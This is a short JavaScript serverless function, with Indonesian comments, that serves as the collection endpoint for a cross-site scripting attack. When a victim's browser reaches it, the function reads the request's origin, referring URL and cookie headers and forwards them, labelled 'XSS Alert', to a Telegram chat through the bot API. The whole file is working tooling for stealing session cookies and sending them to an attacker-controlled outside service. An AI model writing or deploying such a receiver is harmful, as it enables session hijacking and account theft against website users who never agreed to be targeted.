// functions/sendMessage.js
const axios = require('axios');

const token = process.env.TELEGRAM_TOKEN; // Mengakses token dari environment variables
const chatId = process.env.TELEGRAM_CHAT_ID; // Mengakses chat ID dari environment variables

exports.handler = async (event, context) => {
  const textData = '<b>XSS+Alert+in+' + event.headers.origin + '</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + event.headers.referer + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + event.headers.cookie + '</pre>';

  try {
    const response = await axios.get(`https://api.telegram.org/bot${token}/sendMessage`, {
      params: {
        chat_id: chatId,
        text: textData,
        parse_mode: 'HTML',
      },
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: "Pesan berhasil dikirim" }),
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: "Gagal mengirim pesan" }),
    };
  }
};
